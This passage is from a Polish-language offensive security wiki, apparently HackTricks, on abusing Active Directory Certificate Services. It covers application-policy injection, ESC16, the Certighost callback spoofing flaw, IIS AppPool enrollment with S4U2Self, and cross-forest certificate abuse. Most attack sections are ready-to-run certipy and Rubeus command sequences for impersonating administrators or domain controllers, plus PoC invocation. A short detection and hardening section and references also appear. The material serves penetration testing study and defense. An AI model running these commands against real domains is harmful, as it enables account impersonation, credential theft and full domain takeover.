certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Scenariusz A: Bezpośrednia impersonacja za pomocą Schannel

**Krok 1: Zażądaj certyfikatu, wstrzykując politykę aplikacji „Client Authentication” i docelowy UPN.** Atakujący `attacker@corp.local` obiera za cel `administrator@corp.local`, używając szablonu V1 „WebServer” (który pozwala podmiotowi żądającemu certyfikatu podać subject).

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: Podatny szablon V1 z opcją „Enrollee supplies subject”.
- `-application-policies 'Client Authentication'`: Wstrzykuje OID `1.3.6.1.5.5.7.3.2` do rozszerzenia Application Policies żądania CSR.
- `-upn 'administrator@corp.local'`: Ustawia UPN w SAN w celu podszycia się pod użytkownika.

**Krok 2: Uwierzytelnij się przez Schannel (LDAPS) za pomocą uzyskanego certyfikatu.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Scenariusz B: Impersonacja PKINIT/Kerberos przez nadużycie Enrollment Agent

**Krok 1: Zażądaj certyfikatu z szablonu V1 (z opcją „Enrollee supplies subject”), wstrzykując Application Policy „Certificate Request Agent”.** Ten certyfikat jest przeznaczony dla atakującego (`attacker@corp.local`), aby mógł zostać agentem rejestracji. W tym miejscu nie określa się UPN dla własnej tożsamości atakującego, ponieważ celem jest uzyskanie uprawnień agenta.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: Wstrzykuje OID `1.3.6.1.4.1.311.20.2.1`.

**Step 2: Użyj certyfikatu „agent”, aby zażądać certyfikatu w imieniu uprzywilejowanego użytkownika docelowego.** To krok podobny do ESC3, wykorzystujący certyfikat z kroku 1 jako certyfikat agenta.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Krok 3: Uwierzytelnij się jako użytkownik z uprawnieniami, używając certyfikatu „on-behalf-of”.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## Wyłączone rozszerzenie zabezpieczeń na CA (globalnie) — ESC16

### Wyjaśnienie

**ESC16 (eskalacja uprawnień przez brak rozszerzenia szOID_NTDS_CA_SECURITY_EXT)** opisuje globalne dla CA pomijanie rozszerzenia SID **szOID_NTDS_CA_SECURITY_EXT**. Jest to wskaźnik konfiguracji, a nie dowód, że certyfikat może uwierzytelniać jako inne konto. Podszywanie się pod inne konto wymaga również kontroli nad odpowiednimi atrybutami konta lub mapowaniem, szablonu uwierzytelniania klienta umożliwiającego rejestrację oraz ścieżki mapowania certyfikatu akceptowanej przez rzeczywisty kontroler domeny lub usługę. Załatany KDC w trybie Full Enforcement odrzuca certyfikaty bez rozszerzenia SID, chyba że mają inne silne mapowanie; opisana poniżej procedura Kerberos oparta wyłącznie na UPN ma zastosowanie do starszych KDC lub KDC w trybie zgodności, które nadal akceptują słabe mapowanie. Zobacz [wskazówki Microsoft dotyczące mapowania certyfikatów i wymuszania zasad](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Możesz również zapoznać się z tym artykułem, aby dowiedzieć się więcej o szczegółowej zasadzie:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Wykorzystanie

Poniższy historyczny przykład Kerberos oparty wyłącznie na UPN bazuje na [dokumentacji ESC16 w Certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Wymaga KDC, który nadal akceptuje wynikowe słabe mapowanie; `StrongCertificateBindingEnforcement=1` nie jest już obsługiwanym sposobem obejścia tego mechanizmu po aktualizacji zabezpieczeń systemu Windows z 9 września 2025 r.<sup>[[14]](#references)</sup>

Aby ustalić, czy środowisko Active Directory Certificate Services (AD CS) jest podatne na **ESC16**

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**Krok 1: Odczytaj początkowy UPN konta ofiary (opcjonalnie — w celu przywrócenia).  **  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Krok 2: Zaktualizuj UPN konta ofiary, ustawiając go na `sAMAccountName` administratora docelowego.  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Krok 3: (W razie potrzeby) Uzyskaj dane logowania do konta „ofiary” (np. za pomocą Shadow Credentials).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Krok 4: Zażądaj certyfikatu jako użytkownik „ofiara” z szablonu uwierzytelniania klienta, do którego konto może się zapisać (np. „User”), na CA skonfigurowanym pod kątem ESC16.** CA pomija rozszerzenie zabezpieczeń SID w wydanym certyfikacie, ale samo w sobie nie ustanawia to użytecznego mapowania uwierzytelniania. Ustaw zmienną środowiskową pamięci podręcznej poświadczeń Kerberos (polecenie powłoki):

```bash
export KRB5CCNAME=victim.ccache
```

Następnie wystąp o certyfikat:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Krok 5: Przywróć UPN konta „ofiary”.**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Krok 6: Na starszym kontrolerze KDC lub kontrolerze działającym w trybie zgodności, który akceptuje to słabe mapowanie, uwierzytelnij się jako administrator docelowy.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Podmiana tożsamości w callbacku chase przez Rogue LDAP/LSA (Certighost / CVE-2026-54121)

### Wyjaśnienie

**Certighost** wykorzystuje **ścieżkę chase / callback rejestracji AD CS**, w której CA ufa atrybutom żądania podanym przez wnioskodawcę, aby ustalić tożsamość, którą należy umieścić w wystawionym certyfikacie. W publicznym PoC spreparowane żądanie zawiera:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: kontrolowany przez atakującego host/IP, z którym CA się połączy
- **`rmd`**: **nazwa DNS docelowego kontrolera domeny**, którą atakujący chce podszyć

Jeśli CA podąży tą ścieżką chase, połączy się z atakującym przez **SMB/LSA (`445`)** i **LDAP (`389`)**. Atakujący używa **prawdziwego konta komputera** (zwykle utworzonego z wykorzystaniem domyślnego **`ms-DS-MachineAccountQuota`**), aby sesja callback uwierzytelniła się jako prawidłowy principal domeny, ale nieuczciwe usługi zwracają zamiast tego atrybuty tożsamości **docelowego kontrolera domeny**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Jeśli CA **nie wiąże kryptograficznie zwróconej tożsamości z uwierzytelnionym principalem callback**, może wystawić certyfikat dla **kontrolera domeny**, mimo że sesja uwierzytelniła się jako konto komputera kontrolowane przez atakującego. To odróżnia tę lukę od **Certifried**: zamiast modyfikować atrybuty AD, takie jak `dNSHostName`, atakujący **podmienia dane tożsamości podczas rozpoznawania callback przez CA**.<sup>[[2]](#references)</sup>

**Przydatne warunki wstępne:**

- **Dane uwierzytelniające domeny** użytkownika o niskich uprawnieniach
- Możliwość **utworzenia lub ponownego użycia konta komputera**
- Dostępność sieciowa z **CA** do kontrolowanych przez atakującego **portów `389` i `445`**
- Podatna / niezałatana ścieżka obsługi żądań CA (aktualizacja Microsoftu z **14 lipca 2026 r.** dodała **weryfikację DC dla `cdc`** oraz **porównanie rozwiązanych SID**)

Uzyskany plik **`.pfx`** można następnie wykorzystać do **PKINIT**, uzyskując **`.ccache`** oraz — w przebiegu opublikowanego PoC — **hash NT docelowego kontrolera domeny**, co zwykle wystarcza do **pełnego przejęcia domeny**.

### Wykorzystanie

Publiczny PoC automatyzuje cały łańcuch:<sup>[[1]](#references)</sup>

1. Utwórz lub ponownie wykorzystaj kontrolowane przez atakującego **konto komputera**.
2. Uruchom **nieuczciwe nasłuchujące usługi LDAP i SMB/LSA** na portach `389` i `445`.
3. Wyślij żądanie certyfikatu zawierające kontrolowane przez atakującego atrybuty **`cdc`** i docelowy **`rmd`**.
4. Pozwól CA uwierzytelnić się w nieuczciwych usługach nasłuchujących jako kontrolowane konto komputera, ale odpowiadaj na zapytania o tożsamość atrybutami **docelowego kontrolera domeny**.
5. Odbierz podpisany przez CA **certyfikat kontrolera domeny**, a następnie użyj go do **PKINIT**.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

Przydatne flagi runtime z PoC:

- `--listener <ip>`: jawnie wybiera callback IP reklamowany w `cdc`
- `--computer-name <NAME$>`: ponownie wykorzystuje istniejące konto komputera zamiast tworzyć nowe

**Uwagi operacyjne:**

- PoC wymaga **root**, ponieważ nasłuchuje na **uprzywilejowanych portach** `389` i `445`.
- Udane wykorzystanie podatności zapisuje lokalnie **certyfikat DC `.pfx`** i **Kerberos `.ccache`**.
- Ponieważ certyfikat jest mapowany na konto **Domain Controller**, kolejne działania mogą obejmować **uwierzytelnianie Kerberos oparte na certyfikacie**, **DCSync** oraz ponowne wykorzystanie odzyskanego **hasła NT konta komputera**.<sup>[[2]](#references)</sup>

## Rejestracja przez IIS AppPool umożliwiająca uzyskanie uprawnień Administratora na tym samym hoście

Pula IIS działająca jako `ApplicationPoolIdentity` używa **konta komputera** swojego hosta do uzyskiwania dostępu wychodzącego do zasobów sieciowych. Dlatego wykonanie kodu jako `IIS AppPool\<POOL>` zachowuje niskie uprawnienia w lokalnym tokenie, ale może przesłać żądanie do AD CS, które CA uwierzytelni jako `HOST$`; jest to przejście tożsamości dla ruchu wychodzącego, a nie podszywanie się pod token ani lokalna eskalacja uprawnień w stylu Potato.<sup>[[19]](#references)[[20]](#references)</sup>

Ten łańcuch wymaga hosta IIS dołączonego do domeny, Enterprise CA dostępnego przez RPC, opublikowanego szablonu uwierzytelniania komputera, do którego komputer ma uprawnienia rejestracji, obsługi PKINIT oraz łączności z KDC i SMB. Niestandardowa tożsamość puli zmienia podmiot dla ruchu wychodzącego, więc przed założeniem, że jest nim `HOST$`, upewnij się, że pula rzeczywiście używa `ApplicationPoolIdentity`.<sup>[[19]](#references)[[20]](#references)</sup>

### Rejestracja z kluczem kontrolowanym przez atakującego

Wygeneruj parę kluczy i CSR poza serwerem IIS, zachowując klucz prywatny. Prześlij **tylko CSR** ze skompromitowanego procesu roboczego. [PoC Certi-Bhai ASPX](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) tworzy instancję `CertificateAuthority.Request`, ustawia `CertificateTemplate:Machine`, wywołuje `ICertRequest::Submit` i zwraca wystawiony certyfikat. Użyj ciągu konfiguracji CA `CAHOST\CA-NAME`; standardowy szablon `Machine` tworzy subject na podstawie AD, więc dane subject/SAN podane przez żądającego nie są potrzebne.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Połącz zwrócony certyfikat z **pasującym, zachowanym kluczem**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` działa tylko wtedy, gdy Windows może już skojarzyć certyfikat z dostępnym kluczem prywatnym; w przypadku oddzielnych plików PEM utwórz jawnie PKCS#12:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

Użyj pliku PFX do PKINIT i zachowaj zwrócony TGT komputera w postaci base64, zamiast od razu go wstrzykiwać:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self plus podmiana usługi na tym samym hoście

S4U2Self pozwala usłudze uzyskać ticket **do samej siebie**, zawierający dane autoryzacyjne innego użytkownika. Mając TGT komputera, Rubeus może zażądać takiego ticketu dla uprzywilejowanego użytkownika, zmienić nazwę usługi w zwróconym KRB-CRED na CIFS i go inject. To lokalny prymityw „delegate to thyself”: nie wymaga S4U2Proxy ani wpisu `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

Zastępczy ticket może być używany wyłącznie przez usługi na **tym samym koncie/kluczu komputera** (w tym przypadku przez CIFS na `HOST`). Nie jest to ticket Administratora, którego można używać na innych komputerach w domenie. Ponadto przedstawiony wynik zapewnia uprzywilejowany dostęp SMB/systemu plików jako Administrator; uzyskanie lokalnego procesu `NT AUTHORITY\SYSTEM` nadal wymaga osobnego kroku zdalnego wykonania.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Wykrywanie i wzmacnianie zabezpieczeń

- Na CA koreluj zdarzenia Certification Services **4886** (otrzymano żądanie) i **4887** (wydano certyfikat), aby wykrywać nieoczekiwane żądania szablonu `Machine` wysyłane przez konta serwerów IIS.<sup>[[19]](#references)[[24]](#references)</sup>
- Na DC zdarzenie **4768** zawiera pola certyfikatu, gdy używane jest uwierzytelnianie wstępne certyfikatem; generuj alerty dla nietypowych żądań TGT PKINIT dotyczących kont serwerów WWW. Następnie sprawdzaj żądania **4769** dotyczące uprzywilejowanej podszywanej tożsamości i tego samego hosta. Ponieważ Rubeus modyfikuje nazwę usługi KRB-CRED po stronie klienta za pomocą `/altservice`, nie wymagaj, aby nazwa usługi w zdarzeniu 4769 po stronie DC wynosiła `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Szukaj przypadków, w których `w3wp.exe` łączy się z punktami końcowymi CA RPC, nieoczekiwanego tworzenia plików ASPX, dostępu do udziałów administracyjnych z uwierzytelnianiem Kerberos oraz działań polegających na wykradaniu sekretów. W miarę możliwości ogranicz dostęp warstwy aplikacji do CA RPC/KDC/SMB oraz usuń uprawnienia komputerów do rejestracji lub szablony uwierzytelniania komputerów, które nie są wymagane operacyjnie.<sup>[[19]](#references)</sup>

## Kompromitowanie lasów za pomocą certyfikatów — wyjaśnienie w stronie biernej

### Łamanie zaufania między lasami przez przejęte CA

Konfiguracja **rejestracji między lasami** jest stosunkowo prosta. **Certyfikat głównego CA** z lasu zasobów jest **publikowany przez administratorów w lasach kont**, a certyfikaty **enterprise CA** z lasu zasobów są **dodawane do kontenerów `NTAuthCertificates` i AIA w każdym lesie kont**. Innymi słowy, takie rozwiązanie daje **CA w lesie zasobów pełną kontrolę** nad wszystkimi pozostałymi lasami, dla których zarządza infrastrukturą PKI. Jeśli to CA zostanie **przejęte przez atakujących**, mogą oni **fałszować** certyfikaty wszystkich użytkowników zarówno w lesie zasobów, jak i w lasach kont, łamiąc w ten sposób granicę bezpieczeństwa lasu.<sup>[[6]](#references)</sup>

### Uprawnienia do rejestracji przyznane obcym podmiotom

W środowiskach wielolasowych należy zachować ostrożność w przypadku Enterprise CA, które **publikują szablony certyfikatów** umożliwiające **Authenticated Users lub obcym podmiotom** (użytkownikom/grupom spoza lasu, do którego należy Enterprise CA) **rejestrację i edycję**.\
Po uwierzytelnieniu przez relację zaufania AD dodaje do tokenu użytkownika identyfikator SID **Authenticated Users**. Jeśli więc domena ma Enterprise CA z szablonem **przyznającym Authenticated Users uprawnienia do rejestracji**, użytkownik z innego lasu może potencjalnie **zarejestrować się przy użyciu tego szablonu**. Podobnie, jeśli **szablon jawnie przyznaje uprawnienia do rejestracji obcemu podmiotowi**, powstaje w ten sposób **relacja kontroli dostępu między lasami**, umożliwiająca podmiotowi z jednego lasu **rejestrację przy użyciu szablonu z innego lasu**.

Oba scenariusze prowadzą do **zwiększenia powierzchni ataku** między lasami. Atakujący może wykorzystać ustawienia szablonu certyfikatu, aby uzyskać dodatkowe uprawnienia w obcej domenie.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 repozytorium PoC](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n — analiza techniczna Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 — blog SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps — Certified Pre-Owned: nadużywanie Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak — Certipy 4.0: ESC9, ESC10, GUI BloodHound, nowe metody uwierzytelniania i żądań oraz więcej](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps — Shadow Credentials: nadużywanie mapowania kont Key Trust w celu przejęcia konta](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy — historia Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security — przekazywanie do AD Certificate Services przez RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo — ESC12: dostęp powłoki do CA ADCS z YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps — technika nadużycia ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps — technika nadużycia ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki — eskalacja uprawnień (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec — EKUwu: nie tylko kolejny AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 — AD CS ESC16: błędna konfiguracja i wykorzystanie](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark — ponowne omówienie „Delegate 2 Thyself”](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai — PoC rejestracji IIS AD CS](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux — eskalacja uprawnień z IIS AppPool przez punkt końcowy RPC AD CS](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft — tożsamości puli aplikacji](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft — ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications — S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL — polecenie pkcs12](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft — inspekcja Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft — zdarzenie 4768: zażądano biletu uwierzytelniającego Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft — zdarzenie 4769: zażądano biletu usługi Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai — zestaw narzędzi PowerShell do wykorzystania AD CS](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
